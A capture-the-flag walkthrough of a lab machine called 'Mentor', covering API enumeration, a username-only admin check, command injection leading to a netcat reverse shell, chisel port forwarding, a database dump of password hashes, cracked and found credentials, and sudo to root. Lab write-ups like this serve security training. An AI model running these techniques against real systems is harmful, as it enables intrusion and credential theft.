# Mentor

---

## Enumeration

- nmap TCP Scan:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c73bfc3cf9ceee8b4818d5d1af8ec2bb (ECDSA)
|_  256 4440084c0ecbd4f18e7eeda85c68a4f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://mentorquotes.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

- The server reveals its own domain name by redirecting to it, `mentorquotes.htb`
- Found `api` subdomain, `/docs` and `/redoc` are readable
- Upon signing up through the API, my user had the ID of 4
- JWT secret is not crackable with `rockyou.txt` wordlist
- kira's: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imlsb3Zla2lyYSIsImVtYWlsIjoiaWxvdmVraXJhQGtpcmEucm9ja3MifQ.LK7Ji8WoYXgz7ehnHIRwslf19GRalpYrMySbLDsxhuM
- On the `/docs` page, I found some information about `james` with the email `james@mentorquotes.htb`
- Found `/admin` endpoint by fuzzing
- Signed up as user `james` with his email but got an error `user already exists`
- Managed to make 2 accounts, one with the same username and the other with the same email:

```json
{
  "id": 6,
  "email": "james@mentorquotes.htb",
  "username": "james1"
}


// eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lczFAbWVudG9ycXVvdGVzLmh0YiJ9.tqY0iQHU85zAkvffr--v1MMbO37NSNJs0Fo9ZMqRz48

{
  "id": 7,
  "email": "james1@mentorquotes.htb",
  "username": "james"
}

// eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzMSIsImVtYWlsIjoiamFtZXNAbWVudG9ycXVvdGVzLmh0YiJ9.EQ34hpk3tKFcN_auQ4amZYJ-UIICSwdurccYOgUd9dk
```

- The user with `james` as username gave me admin access! Authorization is being checked with only the username!
- users:

```json
{
    "id": 1,
    "email": "james@mentorquotes.htb",
    "username": "james"
  },
  {
    "id": 2,
    "email": "svc@mentorquotes.htb",
    "username": "service_acc"
  }
```

- `/admin` endpoints:

```json
{
  "admin_funcs": {
    "check db connection": "/check",
    "backup the application": "/backup"
  }
}
```

---

## Foothold

- Found a simple command injection in the `admin/backup` endpoint
- Netcat exists on the victim machine
- [nc mkfifo](https://revshells.com) payload got me a revshell,

```sh
nc -lnvp 9000
listening on [any] 9000 ...
connect to [10.10.16.21] from (UNKNOWN) [10.129.106.163] 44717
sh: can't access tty; job control turned off
/app # whoami
whoami
root
```

- That's user

---

## PrivEsc

- I'm inside a docker container
- Found in `db.py` a postgresql database connection, google says it runs on port 5432

```python
# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")
```

- Used chisel to forward this port to my attacking machine
- Kali:

```bash
chisel server -p 8000 -reverse
2022/12/11 10:01:55 server: Reverse tunnelling enabled
2022/12/11 10:01:55 server: Fingerprint Yn/8MEWnPIC05jbSBdjODctPJIrz8pZyLOSzL2qzYIg=
2022/12/11 10:01:55 server: Listening on http://0.0.0.0:8000
2022/12/11 10:01:58 server: session#1: Client version (1.7.7) differs from server version (0.0.0-src)
2022/12/11 10:05:01 server: session#2: Client version (1.7.7) differs from server version (0.0.0-src)
2022/12/11 10:05:01 server: session#2: tun: proxy#R:5432=>172.22.0.1:5432: Listening
```

- Victim:

```sh
./chisel client 10.10.16.21:8000 R:5432:172.22.0.1:5432

2022/12/11 15:05:46 client: Connecting to ws://10.10.16.21:8000
2022/12/11 15:05:47 client: Connected (Latency 64.217687ms)
```

- PostreSQL enum:

```
mentorquotes_db=# SELECT datname FROM pg_database;
     datname     
-----------------
 postgres
 mentorquotes_db
 template1
 template0
(4 rows)

mentorquotes_db=# \dt
          List of relations
 Schema |   Name   | Type  |  Owner   
--------+----------+-------+----------
 public | cmd_exec | table | postgres
 public | quotes   | table | postgres
 public | users    | table | postgres
(3 rows)

mentorquotes_db=# SELECT * FROM users;
 id |          email          |  username   |             password             
----+-------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb  | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb    | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
  4 | ilovekira@kira.rocks    | ilovekira   | d735dbe5a4bb7d535468fb8d36ebcd32
  5 | admin@mentorquotes.htb  | admin       | d735dbe5a4bb7d535468fb8d36ebcd32
  6 | james@mentorquotes.htb  | james1      | d735dbe5a4bb7d535468fb8d36ebcd32
  7 | james1@mentorquotes.htb | james       | d735dbe5a4bb7d535468fb8d36ebcd32
(6 rows)
```

- `svc` account's password is crackable: `123meunomeeivani`
- Used this password to SSH into the host `svc@mentor` and I'm outside the container now
- Ran `linpeas.sh`, here are some interesting results:

```
svc         1669  0.0  0.0   7368  3452 ?        Ss   11:02   0:00 /bin/bash /usr/local/bin/login.sh
svc         2082  0.0  0.6  33460 25120 ?        S    11:03   0:02  _ /usr/bin/python3 /usr/local/bin/login.py kj23sadkj123as0-d213
------------------------------------------------------------------------------------------------------------
╔══════════╣ Searching mysql credentials and exec
Found lib_mysqludf_sys.so:                                   
If you can login in MySQL you can execute commands doing: SELECT sys_eval('id');
------------------------------------------------------------------------------------------------------------
access_log /var/log/nginx/access.log;
error_log /var/log/nginx/error.log;
------------------------------------------------------------------------------------------------------------
/var/lib/snmp/snmpd.conf
/etc/snmp/snmpd.conf
/etc/snmp/snmp.conf
------------------------------------------------------------------------------------------------------------
You own the script: /usr/local/bin/login.sh
```

- Found a password in `/usr/local/big/login.py`: `kj23sadkj123as0-d213` but this is james password on the API
- Found James' password in `/etc/snmp/snmpd.conf`:

```bash
svc@mentor:/etc/snmp$ cat snmpd.conf | grep -i pass
# createUser username (MD5|SHA|SHA-512|SHA-384|SHA-256|SHA-224) authpassphrase [DES|AES] [privpassphrase]
createUser bootstrap MD5 SuperSecurePassword123__ DES
```

- Rooted!

```bash
james@mentor:~$ sudo -l
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh
james@mentor:~$ sudo sh
# whoami
root
# cat /root/root.txt

```

---
